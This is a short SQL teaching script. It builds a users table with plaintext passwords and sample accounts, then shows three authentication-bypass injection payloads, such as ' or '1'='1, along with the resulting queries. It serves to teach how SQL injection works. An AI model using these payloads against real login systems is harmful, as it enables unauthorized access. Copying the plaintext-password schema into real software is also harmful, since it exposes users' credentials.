-- Create a table named users with id, email, and password columns
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    email VARCHAR(50),
    password VARCHAR(50)
);

-- Insert sample data into the users table
INSERT INTO users (email, password) VALUES
('juan@gmail.com', '12345'),
('pedro@gmail.com', '67890'),
('ana@outlook.com', '98765'),
('maria@yahoo.com', '54321');

-- Valid query
SELECT * FROM users WHERE email = 'juan@gmail.com' AND password = '12345';

-- Sql injection example
-- texto' or '1'='1
SELECT * FROM users WHERE email = 'usuario@gmail.com' AND password = 'texto' or '1'='1';
-- texto' or 1=1--
SELECT * FROM users WHERE email = 'usuario@outlook.com' AND password = 'texto' or 1=1--;
-- texto' or 1=1 or ''='
SELECT * FROM users WHERE email = 'usuario@yahoo.com' AND password = 'texto' or 1=1 or ''='';
